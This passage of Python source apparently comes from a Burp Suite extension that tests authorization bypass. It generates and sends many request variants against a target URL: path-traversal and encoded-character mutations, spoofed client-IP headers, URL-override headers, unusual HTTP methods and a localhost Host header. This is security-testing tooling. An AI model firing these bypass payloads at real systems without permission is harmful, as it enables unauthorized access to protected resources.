                            _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                            path = _url[:_locations[2]]
                            for _path in _paths:
                                if _path:
                                    path = path + "/" + _path
                                    url =  _url.replace(path, path + _replaceWith + _path)
                                    if url not in _rowUrls:
                                        _rowUrls.append(url)
                                        _columnNum = _columnNum + 1
                # column6
                


                #column7, example url:  http://dvwa.local/company/users/admin?id=1
                #                       http://dvwa.local/../company/users/admin?id=1
                #                       http://dvwa.local/;/company/users/admin?id=1
                #                       http://dvwa.local/company/;/users/admin?id=1
                #                       http://dvwa.local/company/users/;/admin?id=1
                _replaceWiths = ["/./", "/../", "/..././", "/;/", "//;//", "/.;/", "/;", "/.;", "/%2e/", "/%2f/", "/%20/", "/%3b/", "/%00/", "/%ff/", "/%01/", "/%0a/", "/%0d/", "/%09/"]
                _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                for _replaceWith in _replaceWiths:
                    for _url in _urls:
                        if _url.count('/') == 3:
                            url = _url[: _locations[2]] + _replaceWith + _url[_locations[2] + 1:]
                            if '..' in url:
                                if url not in _rowUrls:
                                    _rowUrls.append(url)
                                    _columnNum = _columnNum + 1
                        else:
                            for _location in _locations[2:]:
                                url = _url[: _location] + _replaceWith + _url[_location + 1:]
                                if url not in _rowUrls:
                                    _rowUrls.append(url)
                                    _columnNum = _columnNum + 1
                                if '..' in url:
                                    break
                #column7


                #column8, example url:  http://dvwa.local/company/users/admin?id=1
                #                       http://dvwa.local/company/users/admin?id=1%00
                #                       http://dvwa.local/company/users/admin?id=1%00/
                #                       http://dvwa.local/company/users/admin?id=1../
                #                       http://dvwa.local/company/users/admin?id=1/../
                #                       http://dvwa.local/company/users/admin?id=1..;/
                _replaceWiths = [".", "./", "../", "/../", "/./", "/.", "/..", "..", "..;/", ".;/", "/..;", "/.;", "/..;/", "/.;/", "%09", "%09/", "/..%09", "..%09", "/.%09", ".%09", "%00", "%00/", "/..%00", "..%00", "/.%00", ".%00", "%ff", "%ff/", "/..%ff", "..%ff", "/.%ff", ".%ff", "%01", "%01/", "/..%01", "..%01", "/.%01", ".%01", "%20", "%20/", "/..%20", "..%20", "/.%20", ".%20", "%0a", "%0a/", "/..%0a", "..%0a", "/.%0a", ".%0a", "%0d", "%0d/", "/..%0d", "..%0d", "/.%0d", ".%0d", "/*", "*", "%2f"]
                _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                for _replaceWith in _replaceWiths:
                    for _url in _urls:
                        url = (_url + _replaceWith).replace("//", "/").replace(":/", "://")
                        if url not in _rowUrls:
                            _rowUrls.append(url)
                            _columnNum = _columnNum + 1
                # column8


                # column9, example url: http://dvwa.local/company/users/admin?id=1
                #                       http://dvwa.local/company/users/admin%00?id=1
                #                       http://dvwa.local/company/users/admin%00/?id=1
                #                       http://dvwa.local/company/users/admin../?id=1
                #                       http://dvwa.local/company/users/admin/../?id=1
                #                       http://dvwa.local/company/users/admin..;/?id=1
                _replaceWiths = [".", "./", "../", "/../", "/./", "/.", "/..", "..", "..;/", ".;/", "/..;", "/.;", "/..;/", "/.;/", "%09", "%09/", "/..%09", "..%09", "/.%09", ".%09", "%00", "%00/", "/..%00", "..%00", "/.%00", ".%00", "%ff", "%ff/", "/..%ff", "..%ff", "/.%ff", ".%ff", "%01", "%01/", "/..%01", "..%01", "/.%01", ".%01", "%20", "%20/", "/..%20", "..%20", "/.%20", ".%20", "%0a", "%0a/", "/..%0a", "..%0a", "/.%0a", ".%0a", "%0d", "%0d/", "/..%0d", "..%0d", "/.%0d", ".%0d", "/*", "*", "%2f"]
                _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                for _replaceWith in _replaceWiths:
                    for _url in _urls:
                        _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                        if urlparse.urlparse(_url).path.endswith("/") and _url.count('/') != 3:
                            url = _url[: _locations[-1]] + _replaceWith + _url[_locations[-1]:]
                        else:
                            url = _url[: _locations[2] + len(urlparse.urlparse(_url).path)] + _replaceWith + _url[_locations[2] + len(urlparse.urlparse(_url).path):]
                        url = url.replace("//", "/").replace(":/", "://")
                        if url not in _rowUrls:
                            _rowUrls.append(url)
                            _columnNum = _columnNum + 1
                # column9


                # column10, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local/%09/company/users/admin/%09/?id=1
                #                           http://dvwa.local/company/%09/users/admin/%09/?id=1
                #                           http://dvwa.local/company/users/%09/admin/%09/?id=1

                _replaceWiths = ["/./", "/%09/", "/%20/", "/%3b/", "/%00/", "/%ff/", "/%01/", "/%0a/", "/%0d/"]
                for _replaceWith in _replaceWiths:
                    for _url in _urls:
                        if _url.count('/') != 3:
                            _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                            if urlparse.urlparse(_url).path.endswith("/") and _url.count('/') != 3:
                                _url = _url[: _locations[-1]] + _replaceWith + _url[_locations[-1]:]
                            else:
                                _url = _url[: _locations[2] + len(urlparse.urlparse(_url).path)] + _replaceWith + _url[_locations[2] + len(urlparse.urlparse(_url).path):]
                            _url = _url.replace("//", "/").replace(":/", "://")
                            _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)][2:-2]
                            for _location in _locations:
                                url = _url[: _location] + _replaceWith + _url[_location + 1:]
                                if url not in _rowUrls:
                                    _rowUrls.append(url)
                                    _columnNum = _columnNum + 1
                # column10


                # column11, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local/%09/company/users/admin%09?id=1
                #                           http://dvwa.local/company/%09/users/admin%09?id=1
                #                           http://dvwa.local/company/users/%09/admin%09?id=1
                _replaceWiths = ["/./", "/%09/", "/%20/", "/%3b/", "/%00/", "/%ff/", "/%01/", "/%0a/", "/%0d/"]
                for _replaceWith in _replaceWiths:
                    for _url in _urls:
                        if _url.count('/') != 3:
                            _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                            if urlparse.urlparse(_url).path.endswith("/") and _url.count('/') != 3:
                                _url = _url[: _locations[-1]] + _replaceWith + _url[_locations[-1]:]
                            else:
                                _url = _url[: _locations[2] + len(urlparse.urlparse(_url).path)] + _replaceWith[1:-1] + _url[_locations[2] + len(urlparse.urlparse(_url).path):]
                            _url = _url.replace("//", "/").replace(":/", "://")
                            _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)][2:-2]
                            for _location in _locations:
                                url = _url[: _location] + _replaceWith + _url[_location + 1:]
                                if url not in _rowUrls:
                                    _rowUrls.append(url)
                                    _columnNum = _columnNum + 1
                # column11


                # column12, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local/%09/company/users/admin?id=1/%09/
                #                           http://dvwa.local/company/%09/users/admin?id=1/%09/
                #                           http://dvwa.local/company/users/%09/admin?id=1/%09/
                _replaceWiths = ["/./", "/%09/", "/%20/", "/%3b/", "/%00/", "/%ff/", "/%01/", "/%0a/", "/%0d/"]
                for _replaceWith in _replaceWiths:
                    for _url in _urls:
                        if _url.count('/') != 3:
                            _url = (_url + _replaceWith).replace("//", "/").replace(":/", "://")
                            _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)][2:-2]
                            for _location in _locations:
                                url = _url[: _location] + _replaceWith + _url[_location + 1:]
                                if url not in _rowUrls:
                                    _rowUrls.append(url)
                                    _columnNum = _columnNum + 1
                # column12



                # column13, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local/%09/company/users/admin?id=1%09
                #                           http://dvwa.local/company/%09/users/admin?id=1%09
                #                           http://dvwa.local/company/users/%09/admin?id=1%09
                _replaceWiths = ["/./", "/%09/", "/%20/", "/%3b/", "/%00/", "/%ff/", "/%01/", "/%0a/", "/%0d/"]
                for _replaceWith in _replaceWiths:
                    for _url in _urls:
                        if _url.count('/') != 3:
                            _url = (_url + _replaceWith[1:-1]).replace("//", "/").replace(":/", "://")
                            _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)][2:-2]
                            for _location in _locations:
                                url = _url[: _location] + _replaceWith + _url[_location + 1:]
                                if url not in _rowUrls:
                                    _rowUrls.append(url)
                                    _columnNum = _columnNum + 1
                # column13


                # column14, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local/company/users/admin.html?id=1
                _fileExtensions = [".js", ";.js", ".html", ";.html", ".js%2f", ";.js%2f", ".html%2f", ";.html%2f", ";index.html", "%00.html", ";%00.html", "%00.js", ";%00.js"]
                for _url in _urls:
                    if len(urlparse.urlparse(_url).path) > 1:
                        _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                        for _fileExtension in _fileExtensions:
                            if urlparse.urlparse(_url).path.endswith("/"):
                                url = _url[: _locations[-1]] + _fileExtension + "/" + _url[_locations[-1] + 1:]
                            else:
                                url = _url[: _locations[2] + len(urlparse.urlparse(_url).path)] + _fileExtension + _url[_locations[2] + len(urlparse.urlparse(_url).path):]
                            if url not in _rowUrls:
                                _rowUrls.append(url)
                                _columnNum = _columnNum + 1
                # column14


                # column15, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local//company//users//admin?id=1
                _replaceWiths = ["//", "///", "////", "/////"]
                for _replaceWith in _replaceWiths:
                    for _url in _urls:
                        if _url.count('/') == 3:
                            _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                            url = _url[: _locations[2]] + _replaceWith + _url[_locations[2] + 1:]
                        else:
                            url = _url.replace(urlparse.urlparse(_url).path, urlparse.urlparse(_url).path.replace("/", _replaceWith))
                        if url not in _rowUrls:
                            _rowUrls.append(url)
                            _columnNum = _columnNum + 1
                # column15


                # column16, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local/COMPANY/USERS/ADMIN?ID=1
                #                           http://dvwa.local/company/USERS/ADMIN?ID=1
                #                           http://dvwa.local/company/users/ADMIN?ID=1
                for _url in _urls:
                    if _url.endswith('/'):
                        _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                    else: 
                        _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                        _locations.append(len(_url))
                    for _location in _locations[2:-1]:
                        url = _url[:_location] + _url[_location:].upper()
                        if url not in _rowUrls:
                            _rowUrls.append(url)
                            _columnNum = _columnNum + 1
                        url = _url[:_location] + _url[_location:].lower()
                        if url not in _rowUrls:
                            _rowUrls.append(url)
                            _columnNum = _columnNum + 1
                # column16


                # column17, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local/company/users/admin/?id=1
                for _url in _urls:
                    if len(urlparse.urlparse(_url).path) > 1:
                        _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                        if urlparse.urlparse(_url).path.endswith("/"):
                            url = _url[: _locations[-1]] + _url[_locations[-1]:][1:]
                        else:
                            url = _url[: _locations[2] + len(urlparse.urlparse(_url).path)] + "/" + _url[_locations[2] + len(urlparse.urlparse(_url).path):]
                        if url not in _rowUrls:
                            _rowUrls.append(url)
                            _columnNum = _columnNum + 1
                # column17



                # column18, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local/company/../company/users/admin%00?id=1
                #                           http://dvwa.local/company/users/../users/admin%00?id=1
                _replaceWith =  "/../"
                for _url in _urls:
                    if _url.count('/') != 3:
                        if urlparse.urlparse(_url).path.endswith('/'):
                            _url = _url.replace(urlparse.urlparse(_url).path, urlparse.urlparse(_url).path[:-1] + "%00/")
                            _paths = urlparse.urlparse(_url).path.split('/', urlparse.urlparse(_url).path.count('/'))[:-2]
                        else: 
                            _url = _url.replace(urlparse.urlparse(_url).path, urlparse.urlparse(_url).path + "%00")
                            _paths = urlparse.urlparse(_url).path.split('/', urlparse.urlparse(_url).path.count('/'))[:-1]
                        _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                        path = _url[:_locations[2]]
                        for _path in _paths:
                            if _path:
                                path = path + "/" + _path
                                url = _url.replace(_url[: _locations[_url.count('/') - 1]], _url[: _locations[_url.count('/') - 1]])
                                url =  url.replace(path, path + _replaceWith + _path)
                                if url not in _rowUrls:
                                    _rowUrls.append(url)
                                    _columnNum = _columnNum + 1
                # column18


                # column19, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local/company/../company/users/admin?id=1%00
                #                           http://dvwa.local/company/users/../users/admin?id=1%00
                _replaceWith =  "/../"
                for _url in _urls:
                    if _url.count('/') != 3:
                        _url = _url + "%00"
                        if urlparse.urlparse(_url).path.endswith('/'):
                            _paths = urlparse.urlparse(_url).path.split('/', urlparse.urlparse(_url).path.count('/'))[:-2]
                        else: 
                            _paths = urlparse.urlparse(_url).path.split('/', urlparse.urlparse(_url).path.count('/'))[:-1]
                        _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                        path = _url[:_locations[2]]
                        for _path in _paths:
                            if _path:
                                path = path + "/" + _path
                                url = _url.replace(_url[: _locations[_url.count('/') - 1]], _url[: _locations[_url.count('/') - 1]])
                                url =  url.replace(path, path + _replaceWith + _path)
                                if url not in _rowUrls:
                                    _rowUrls.append(url)
                                    _columnNum = _columnNum + 1
                # column19


                self.cellNumbers = self.cellNumbers + _columnNum
                if columnNum < _columnNum:
                    columnNum = _columnNum

            except:
                print str(sys.exc_info()[1])

        return columnNum

    def attmeptPossibilities(self):
        try:
            _urls = []
            for x in range(0, self.tableMatrixAuthentication_DM.getRowCount()):
                _urls.append(self.tableMatrixAuthentication_DM.getValueAt(x, 0))
            _range = self.columnNumber(_urls)
            _columnNames = []
            _columnNames.append('URLs')
            for x in range(1, _range + 1):
                _columnNames.append(str(x))

            self.tableMatrixAuthentication_DM.removeRow(self.tableMatrixAuthentication_DM.getRowCount() - 1)
            self.tableMatrixAuthentication = []
            self.tableMatrixAuthentication_DM = CustomDefaultTableModel(self.tableMatrixAuthentication, _columnNames)
            self.tableMatrixAuthentication = JTable(self.tableMatrixAuthentication_DM)
            self.tableMatrixAuthentication_SP.getViewport().setView((self.tableMatrixAuthentication))
            self.tableMatrixAuthentication.getSelectionModel().addListSelectionListener(self._updateAuthenticationReqResView)
            self.tableMatrixAuthentication.getColumnModel().getSelectionModel().addListSelectionListener(self._updateAuthenticationReqResView)
            self.tableMatrixAuthentication.getColumnModel().getColumn(0).setPreferredWidth(400)
            for _url in _urls:
                self.tableMatrixAuthentication_DM.addRow([_url])
        except:
            print str(sys.exc_info()[1])

    def urlDuplicator(self, url):
        urls =[]
        urls.append(url)
        
        if urlparse.urlparse(url).path.endswith("/") and url.count("/") == 3:
            return urls
        elif urlparse.urlparse(url).path.endswith("/"):
            urls.append((urlparse.urlparse(url).path[:-1]).join(url.rsplit(urlparse.urlparse(url).path, 1)))
        else:
            urls.append((urlparse.urlparse(url).path + "/").join(url.rsplit(urlparse.urlparse(url).path, 1)))        
        return urls

    def authenticationMatrixThread(self, ev, _matrixList):
        self._requestViewerAuthentication.setMessage("", False)
        self._responseViewerAuthentication.setMessage("", False)
        self._btnAuthenticationFetchHistory.setEnabled(False)
        self._httpCalls =[]
        self._httpReqResAuthentication =[]
        self._httpReqResAuthenticationTipMessage =[]
        self.progressBarAuthenticationPanel.setValue(0)
        self._btnAuthenticationReset.setEnabled(False)
        self._cbAuthenticationHost.setEnabled(False)
        self._btnAuthenticationRun.setEnabled(False)
        self._cbAuthenticationEnableFilter.setEnabled(False)
        self._lblAuthenticationDaystoShow.setEnabled(False)
        self._cbAuthenticationDaystoShow.setEnabled(False)
        self._lblAuthenticationEnableURLGroup.setEnabled(False)
        self._cbAuthenticationEnableURLGroup.setEnabled(False)
        self._lblAuthenticationEnableFilter2.setEnabled(False)
        self._lblAuthenticationDaystoShow.setVisible(False)
        self._cbAuthenticationDaystoShow.setVisible(False)
        self.txAuthenticationEnableKeyWordURL.setEnabled(False)

        for x in range(0, self.tableMatrixAuthentication_DM.getRowCount()):
            for y in range(1, self.tableMatrixAuthentication_DM.getColumnCount()):
                self.tableMatrixAuthentication_DM.setValueAt("", x, y)
                
        self._lblAuthenticationNotification.text = "Just a moment, the table dimension is being calculated."
        self.errorNumbers = 0
        try:
            self.attmeptPossibilities()
            _progressBar = 1000000 / ( self.cellNumbers)
            _columnNum = 0
            for x in range(0, self.tableMatrixAuthentication_DM.getRowCount()):
                _columnNum = 0
                _reqRes =[]
                _cellHint = []
                _rowUrls = []
                _portNum = 80
                if urlparse.urlparse(str(_matrixList[x][0])).port:
                    _portNum = urlparse.urlparse(str(_matrixList[x][0])).port
                else:
                    if urlparse.urlparse(str(_matrixList[x][0])).scheme == "https":
                        _portNum = 443

                _body = _matrixList[x][2]
                _urls = self.urlDuplicator(_matrixList[x][0])
                _searchFor = '/'
                _replaceWith = ''
                # column0 Urls
                _cellHint.append("URL list.")
                # column0


                # column1 Base Request
                _url = str(_matrixList[x][0])
                _rowUrls.append(_url)
                _header = list(_matrixList[x][1])
                _reqRes.append(_url)
                self._httpCalls =[]
                _columnNum = _columnNum + 1
                _reqRes.append(self.authenticationMatrixCalls(_url, _header, _body, _portNum, x, _columnNum, _progressBar))
                _cellHint.append("Base request: '" + _url + "'")
                # column1


                # column2 Http request method has been replaced with others
                _reqMethods = ["ABC ", "TRACE ", "CONNECT ", "PATCH ", "DEBUG "]
                _headerOrg = list(_matrixList[x][1])
                for _reqMethod in _reqMethods:
                    for _url in _urls:
                        _header = list(_headerOrg[1:])
                        _header.insert(0, _reqMethod + _url[_url.rfind(urlparse.urlparse(_url).path):] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                        self._httpCalls =[]
                        _columnNum = _columnNum + 1
                        _reqRes.append(self.authenticationMatrixCalls(_url, _header, _body, _portNum, x, _columnNum, _progressBar))
                        _cellHint.append("Http request method has been replaced with '"+ _reqMethod + "', '" + _url + "'")
                # column2


                # column3 'X-*' parameter has been added to the header.
                _headerParams = ["X-Originating-IP: ", "X-Forwarded-For: ", "X-Forwarded: ", "X-Remote-IP: ", "X-Remote-Addr: ", "X-ProxyUser-Ip: ", "X-Client-IP: ", "True-Client-IP: ", "Cluster-Client-IP: ", "X-Custom-IP-Authorization: ", "X-Forward-For: ", "X-Real-IP: ", "X-Host: ", "X-Forwarded-Host: ", "X-Trusted-IP: ", "X-Forwarded-Server: "]
                _headerValues = ["127.0.0.1", _url.replace(urlparse.urlparse(_url).netloc.split(':',1)[0], 'localhost').split('/',3)[0] + "//" + _url.replace(urlparse.urlparse(_url).netloc.split(':',1)[0], 'localhost').split('/',3)[2]]
                _headerOrg = list(_matrixList[x][1])
                for _headerParam in _headerParams:
                    for _headerValue in _headerValues:
                        for _url in _urls:
                            _header = list(_headerOrg[1:])
                            _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " " + _url[_url.rfind(urlparse.urlparse(_url).path):] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                            _header.insert(2, _headerParam + _headerValue)
                            self._httpCalls =[]
                            _columnNum = _columnNum + 1
                            _reqRes.append(self.authenticationMatrixCalls(_url, _header, _body, _portNum, x, _columnNum, _progressBar))
                            _cellHint.append("'" + _headerParam[:-2] + "' parameter has been added to the request header, '" + _url + "'")
                # column3


                # column4 'X-*' parameter has been added to the header.
                _headerParams = ["X-Original-URL: ", "X-Rewrite-URL: ", "X-Override-URL: ", "X-Http-Destinationurl: ", "X-Proxy-Url: "]
                _headerValues = [_url.split("/", 3)[3]]
                _headerOrg = list(_matrixList[x][1])
                for _headerParam in _headerParams:
                    for _url in _urls:
                        _header = list(_headerOrg[1:])
                        _header.insert(1, _headerParam + urlparse.urlparse(_url).path)
                        _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " " + _url[_url.rfind(urlparse.urlparse(_url).path):] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                        self._httpCalls =[]
                        _columnNum = _columnNum + 1
                        _reqRes.append(self.authenticationMatrixCalls(_url, _header, _body, _portNum, x, _columnNum, _progressBar))
                        _cellHint.append("'" + _headerParam + "' parameter has been added to the request header, '" + _url + "'")
                # column4


                # column5 'Host' parameter has been replaced with 'localhost'
                _hostParams = ["localhost", "127.0.0.1"]
                _headerOrg = list(_matrixList[x][1])
                for _hostParam in _hostParams:
                    for _url in _urls:
                        _header = list(_headerOrg[1:])
                        _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " " + _url[_url.rfind(urlparse.urlparse(_url).path):] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                        for line in _header:
                            if line.startswith("Host: "):
                                _header.remove(line)
                                break
                        _header.insert(1, "Host: " + _hostParam)
                        self._httpCalls =[]
                        _columnNum = _columnNum + 1
                        _reqRes.append(self.authenticationMatrixCalls(_url, _header, _body, _portNum, x, _columnNum, _progressBar))
                        _cellHint.append("'Host' parameter has been replaced with '" + _hostParam + "', '" + _url + "'")
                # column5


                # column6, example url: http://dvwa.local/company/users/admin?id=1
                #                       http://dvwa.local/company/../company/users/admin?id=1
                #                       http://dvwa.local/company/users/../users/admin?id=1
                #                       http://dvwa.local/company/users/admin/../admin?id=1
                _headerOrg = list(_matrixList[x][1])
                _replaceWiths = ["/%2e%2e/", "/../", "/..././", "/..;/", "/..;", "..;"]
                for _replaceWith in _replaceWiths:
                    for _url in _urls:
                        if _url.count('/') != 3:
                            if urlparse.urlparse(_url).path.endswith('/'):
                                _paths = urlparse.urlparse(_url).path.split('/', urlparse.urlparse(_url).path.count('/'))[:-1]
                            else: 
                                _paths = urlparse.urlparse(_url).path.split('/', urlparse.urlparse(_url).path.count('/'))
                            _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                            path = _url[:_locations[2]]
                            for _path in _paths:
                                if _path:
                                    path = path + "/" + _path
                                    url =  _url.replace(path, path + _replaceWith + _path)
                                    if url not in _rowUrls:
                                        _rowUrls.append(url)
                                        _header = list(_headerOrg[1:])
                                        _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " /" + url.split("/", 3)[3] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                                        self._httpCalls =[]
                                        _columnNum = _columnNum + 1
                                        _reqRes.append(self.authenticationMatrixCalls(url, _header, _body, _portNum, x, _columnNum, _progressBar))
                                        _cellHint.append("Target URL is '" + url + "'")
                # column6
                


                #column7, example url:  http://dvwa.local/company/users/admin?id=1
                #                       http://dvwa.local/../company/users/admin?id=1
                #                       http://dvwa.local/;/company/users/admin?id=1
                #                       http://dvwa.local/company/;/users/admin?id=1
                #                       http://dvwa.local/company/users/;/admin?id=1
                _headerOrg = list(_matrixList[x][1])
                _replaceWiths = ["/./", "/../", "/..././", "/;/", "//;//", "/.;/", "/;", "/.;", "/%2e/", "/%2f/", "/%20/", "/%3b/", "/%00/", "/%ff/", "/%01/", "/%0a/", "/%0d/", "/%09/"]
                _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                for _replaceWith in _replaceWiths:
                    for _url in _urls:
                        if _url.count('/') == 3:
                            url = _url[: _locations[2]] + _replaceWith + _url[_locations[2] + 1:]
                            if '..' in url:
                                if url not in _rowUrls:
                                    _rowUrls.append(url)
                                    _header = list(_headerOrg[1:])
                                    _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " /" + url.split("/", 3)[3] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                                    self._httpCalls =[]
                                    _columnNum = _columnNum + 1
                                    _reqRes.append(self.authenticationMatrixCalls(url, _header, _body, _portNum, x, _columnNum, _progressBar))
                                    _cellHint.append("Target URL is '" + url + "'")
                        else:
                            for _location in _locations[2:]:
                                url = _url[: _location] + _replaceWith + _url[_location + 1:]
                                if url not in _rowUrls:
                                    _rowUrls.append(url)
                                    _header = list(_headerOrg[1:])
                                    _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " /" + url.split("/", 3)[3] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                                    self._httpCalls =[]
                                    _columnNum = _columnNum + 1
                                    _reqRes.append(self.authenticationMatrixCalls(url, _header, _body, _portNum, x, _columnNum, _progressBar))
                                    _cellHint.append("Target URL is '" + url + "'")
                                if '..' in url:
                                    break
                #column7


                #column8, example url:  http://dvwa.local/company/users/admin?id=1
                #                       http://dvwa.local/company/users/admin?id=1%00
                #                       http://dvwa.local/company/users/admin?id=1%00/
                #                       http://dvwa.local/company/users/admin?id=1../
                #                       http://dvwa.local/company/users/admin?id=1/../
                #                       http://dvwa.local/company/users/admin?id=1..;/
                _headerOrg = list(_matrixList[x][1])
                _replaceWiths = [".", "./", "../", "/../", "/./", "/.", "/..", "..", "..;/", ".;/", "/..;", "/.;", "/..;/", "/.;/", "%09", "%09/", "/..%09", "..%09", "/.%09", ".%09", "%00", "%00/", "/..%00", "..%00", "/.%00", ".%00", "%ff", "%ff/", "/..%ff", "..%ff", "/.%ff", ".%ff", "%01", "%01/", "/..%01", "..%01", "/.%01", ".%01", "%20", "%20/", "/..%20", "..%20", "/.%20", ".%20", "%0a", "%0a/", "/..%0a", "..%0a", "/.%0a", ".%0a", "%0d", "%0d/", "/..%0d", "..%0d", "/.%0d", ".%0d", "/*", "*", "%2f"]
                _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                for _replaceWith in _replaceWiths:
                    for _url in _urls:
                        url = (_url + _replaceWith).replace("//", "/").replace(":/", "://")
                        if url not in _rowUrls:
                            _rowUrls.append(url)
                            _header = list(_headerOrg[1:])
                            _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " /" + url.split("/", 3)[3] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                            self._httpCalls =[]
                            _columnNum = _columnNum + 1
                            _reqRes.append(self.authenticationMatrixCalls(url, _header, _body, _portNum, x, _columnNum, _progressBar))
                            _cellHint.append("Target URL is '" + url + "'")
                # column8


                # column9, example url: http://dvwa.local/company/users/admin?id=1
                #                       http://dvwa.local/company/users/admin%00?id=1
                #                       http://dvwa.local/company/users/admin%00/?id=1
                #                       http://dvwa.local/company/users/admin../?id=1
                #                       http://dvwa.local/company/users/admin/../?id=1
                #                       http://dvwa.local/company/users/admin..;/?id=1
                _headerOrg = list(_matrixList[x][1])
                _replaceWiths = [".", "./", "../", "/../", "/./", "/.", "/..", "..", "..;/", ".;/", "/..;", "/.;", "/..;/", "/.;/", "%09", "%09/", "/..%09", "..%09", "/.%09", ".%09", "%00", "%00/", "/..%00", "..%00", "/.%00", ".%00", "%ff", "%ff/", "/..%ff", "..%ff", "/.%ff", ".%ff", "%01", "%01/", "/..%01", "..%01", "/.%01", ".%01", "%20", "%20/", "/..%20", "..%20", "/.%20", ".%20", "%0a", "%0a/", "/..%0a", "..%0a", "/.%0a", ".%0a", "%0d", "%0d/", "/..%0d", "..%0d", "/.%0d", ".%0d", "/*", "*", "%2f"]
                _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                for _replaceWith in _replaceWiths:
                    for _url in _urls:
                        _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                        if urlparse.urlparse(_url).path.endswith("/") and _url.count('/') != 3:
                            url = _url[: _locations[-1]] + _replaceWith + _url[_locations[-1]:]
                        else:
                            url = _url[: _locations[2] + len(urlparse.urlparse(_url).path)] + _replaceWith + _url[_locations[2] + len(urlparse.urlparse(_url).path):]
                        url = url.replace("//", "/").replace(":/", "://")
                        if url not in _rowUrls:
                            _rowUrls.append(url)
                            _header = list(_headerOrg[1:])
                            _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " /" + url.split("/", 3)[3] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                            self._httpCalls =[]
                            _columnNum = _columnNum + 1
                            _reqRes.append(self.authenticationMatrixCalls(url, _header, _body, _portNum, x, _columnNum, _progressBar))
                            _cellHint.append("Target URL is '" + url + "'")
                # column9


                # column10, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local/%09/company/users/admin/%09/?id=1
                #                           http://dvwa.local/company/%09/users/admin/%09/?id=1
                #                           http://dvwa.local/company/users/%09/admin/%09/?id=1
                _headerOrg = list(_matrixList[x][1])
                _replaceWiths = ["/./", "/%09/", "/%20/", "/%3b/", "/%00/", "/%ff/", "/%01/", "/%0a/", "/%0d/"]
                for _replaceWith in _replaceWiths:
                    for _url in _urls:
                        if _url.count('/') != 3:
                            _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                            if urlparse.urlparse(_url).path.endswith("/") and _url.count('/') != 3:
                                _url = _url[: _locations[-1]] + _replaceWith + _url[_locations[-1]:]
                            else:
                                _url = _url[: _locations[2] + len(urlparse.urlparse(_url).path)] + _replaceWith + _url[_locations[2] + len(urlparse.urlparse(_url).path):]
                            _url = _url.replace("//", "/").replace(":/", "://")
                            _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)][2:-2]
                            for _location in _locations:
                                url = _url[: _location] + _replaceWith + _url[_location + 1:]
                                if url not in _rowUrls:
                                    _rowUrls.append(url)
                                    _header = list(_headerOrg[1:])
                                    _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " /" + url.split("/", 3)[3] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                                    self._httpCalls =[]
                                    _columnNum = _columnNum + 1
                                    _reqRes.append(self.authenticationMatrixCalls(url, _header, _body, _portNum, x, _columnNum, _progressBar))
                                    _cellHint.append("Target URL is '" + url + "'")
                # column10


                # column11, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local/%09/company/users/admin%09?id=1
                #                           http://dvwa.local/company/%09/users/admin%09?id=1
                #                           http://dvwa.local/company/users/%09/admin%09?id=1
                _headerOrg = list(_matrixList[x][1])
